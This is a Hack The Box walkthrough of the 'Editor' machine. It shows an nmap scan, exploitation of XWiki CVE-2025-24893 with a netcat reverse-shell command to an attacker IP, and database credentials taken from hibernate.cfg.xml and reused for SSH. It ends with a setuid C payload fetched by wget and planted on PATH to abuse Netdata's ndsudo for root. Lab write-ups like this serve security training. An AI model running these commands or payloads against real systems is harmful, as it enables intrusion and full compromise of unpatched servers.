---
title: Editor — HTB
author: Radeel Ahmad
pubDatetime: 2025-08-03T16:53:00Z
tags:
  - hacking
  - HTB
  - XWiki
  - CVE-2025-24893
  - netdata
description:
  Hack The Box "Editor" walkthrough — exploiting XWiki CVE-2025-24893 for remote code execution, leaking DB credentials from hibernate.cfg.xml for SSH access, and abusing an untrusted-search-path flaw in netdata's ndsudo SUID binary for root.
---

### Editor — HTB

In this article, I will provide a step-by-step guide to solve the Hack The Box machine '**Editor**'.

![](/blog/images/htb/1*t15yZ9hEnoXMkNu5MnUl2A.png)

Nmap Scan:

```
┌──(kali㉿kali)-[~/Desktop/HTB/Editor]
└─$ nmap -sV -sC -A 10.10.11.80
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-03 16:53 UTC
Nmap scan report for editor.htb (10.10.11.80)
Host is up (0.26s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Editor - SimplistCode Pro
8080/tcp open  http    Jetty 10.0.20
| http-webdav-scan:
|   Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, LOCK, UNLOCK
|   WebDAV type: Unknown
|_  Server Type: Jetty(10.0.20)
|_http-open-proxy: Proxy might be redirecting requests
| http-methods:
|_  Potentially risky methods: PROPFIND LOCK UNLOCK
| http-title: XWiki - Main - Intro
|_Requested resource was http://editor.htb:8080/xwiki/bin/view/Main/
| http-cookie-flags:
|   /:
|     JSESSIONID:
|_      httponly flag not set
|_http-server-header: Jetty(10.0.20)
| http-robots.txt: 50 disallowed entries (15 shown)
| /xwiki/bin/viewattachrev/ /xwiki/bin/viewrev/
| /xwiki/bin/pdf/ /xwiki/bin/edit/ /xwiki/bin/create/
| /xwiki/bin/inline/ /xwiki/bin/preview/ /xwiki/bin/save/
| /xwiki/bin/saveandcontinue/ /xwiki/bin/rollback/ /xwiki/bin/deleteversions/
| /xwiki/bin/cancel/ /xwiki/bin/delete/ /xwiki/bin/deletespace/
|_/xwiki/bin/undelete/
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

```
TRACEROUTE (using port 111/tcp)
HOP RTT       ADDRESS
1   258.01 ms 10.10.14.1
2   257.06 ms editor.htb (10.10.11.80)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 865.57 seconds
```

Update `etc/host`:

```
10.10.11.80 editor.htb
```

![](/blog/images/htb/1*_xHJF_5I3hZhr46ciZO5yw.png)

Under **Quick Links-Documentation**, we see another subdomain `http://wiki.editor.htb/xwiki/`

Update `/etc/host`:

```
10.10.11.80 wiki.editor.htb
```

![](/blog/images/htb/1*2VEQVMQx7ehDcvqqYoZkwA.png)

![](/blog/images/htb/1*iGapVgDvEJWYFn3GI0WPgg.png)

- **XWiki Debian 15.10.8** is running
- This version is vulnerable

**CVE-2025–24893-EXP/CVE-2025–24893-EXP.py** — a public proof-of-concept exploit for the XWiki remote code execution vulnerability.

Run the exploit and we get a connection on Netcat.

```
──(kali㉿kali)-[~/Desktop/HTB/Editor]
└─$ python3 exploit.py -u http://wiki.editor.htb -c 'busybox nc 10.10.14.160 4444 -e /bin/bash'
```

```
===========================================================
                   CVE-2025-24893
            XWiki Remote Code Execution Exploit
                      Author: Artemir
===========================================================
[-] Request failed: HTTPConnectionPool(host='wiki.editor.htb', port=80): Read timed out. (read timeout=10)
```

```
┌──(kali㉿kali)-[~/Downloads]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.160] from (UNKNOWN) [10.10.11.80] 36528
python3 -c 'import pty;pty.spawn("/bin/bash")'
xwiki@editor:/usr/lib/xwiki-jetty$ ls
ls
jetty  start.d          start_xwiki_debug.bat  start_xwiki.sh  stop_xwiki.sh
logs   start_xwiki.bat  start_xwiki_debug.sh   stop_xwiki.bat  webapps
xwiki@editor:/usr/lib/xwiki-jetty$
```

#### Stabilize your shell

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

```
┌──(kali㉿kali)-[~/Downloads]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.160] from (UNKNOWN) [10.10.11.80] 43074
python3 -c 'import pty;pty.spawn("/bin/bash")'
xwiki@editor:/usr/lib/xwiki-jetty$ ls
jetty  start.d          start_xwiki_debug.bat  start_xwiki.sh  stop_xwiki.sh
logs   start_xwiki.bat  start_xwiki_debug.sh   stop_xwiki.bat  webapps
```

> The file — `hibernate.cfg.xml` — is a Hibernate configuration file, typically used in Java applications that rely on Hibernate ORM (Object Relational Mapping) to manage database interactions.

Under `/usr/lib/xwiki-jetty/webapps/xwiki/WEB-INF`, we found the file hibernate.cfg.xml, which contains credentials.

```
xwiki@editor:/usr/lib/xwiki-jetty/webapps/xwiki/WEB-INF$ cat hibernate.cfg.xml
.
.
.
.
.
.
.
.
.
    <property name="hibernate.connection.url">jdbc:mysql://localhost/xwiki?useSSL=false&amp;connectionTimeZone=LOCAL&amp;allowPublicKeyRetrieval=true</property>
    <property name="hibernate.connection.username">xwiki</property>
    <property name="hibernate.connection.password">theEd1t0rTeam99</property>
    <property name="hibernate.connection.driver_class">com.mysql.cj.jdbc.Driver</property>
    <property name="hibernate.dbcp.poolPreparedStatements">true</property>
    <property name="hibernate.dbcp.maxOpenPreparedStatements">20</property>
.
.
.
.
.
.
.
.
```

- Username: `oliver`
- Password: `theEd1t0rTeam99`

```
┌──(kali㉿kali)-[~/Desktop/HTB/Editor]
└─$ssh oliver@10.10.11.80
oliver@10.10.11.80's password:
oliver@editor:~$ ls
user.txt
oliver@editor:~$ cat user.txt
a3a25dd5ea1427***************
oliver@editor:~$
```

---

### Privilege Escalation

We enumerate SUID binaries

```
oliver@editor:~$ find / -perm -4000 -type f 2>/dev/null
/opt/netdata/usr/libexec/netdata/plugins.d/cgroup-network
/opt/netdata/usr/libexec/netdata/plugins.d/network-viewer.plugin
/opt/netdata/usr/libexec/netdata/plugins.d/local-listeners
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
/opt/netdata/usr/libexec/netdata/plugins.d/ioping
/opt/netdata/usr/libexec/netdata/plugins.d/nfacct.plugin
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.plugin
```

We inspect the `ndsudo` binary permissions

```
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
```

Exploit:

**ndsudo: local privilege escalation via untrusted search path** — the `ndsudo` tool shipped with affected versions of the Netdata Agent allows an attacker to run arbitrary commands by planting a malicious binary earlier in `PATH`.

Create this C payload on your system:

```
┌──(kali㉿kali)-[~/Desktop/HTB/Editor]
└─$ cat megacli.c
#include <unistd.h>
#include <stdlib.h>
int main(){
  setuid(0);
  setgid(0);
  execl("/bin/bash", "bash", "-i", NULL);
  return 0;
}
```

```
┌──(kali㉿kali)-[~/Desktop/HTB/Editor]
└─$ gcc megacli.c -o megacli

┌──(kali㉿kali)-[~/Desktop/HTB/Editor]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Injecting Malicious Binary

Exploit `ndsudo` using `megacli-disk-info`

```
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo megacli-disk-info
```

```
oliver@editor:~$ mkdir ~/fakebin
oliver@editor:~$ wget -q http://10.10.14.160:80/megacli -O ~/fakebin/megacli
oliver@editor:~$ chmod +x ~/fakebin/megacli
oliver@editor:~$ export PATH=~/fakebin:$PATH
oliver@editor:~$ /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo megacli-disk-info
root@editor:/home/oliver# whoami
root
root@editor:/home/oliver#
root@editor:/home/oliver# cat /root/root.txt
5527fa0d00bbbd***************
root@editor:/home/oliver#
```

---

**Thank You** for reading this article. I hope that you have found this information provided to be valuable and helpful. Use it for educational purposes only…. 🙂

**RADEEL AHMAD**
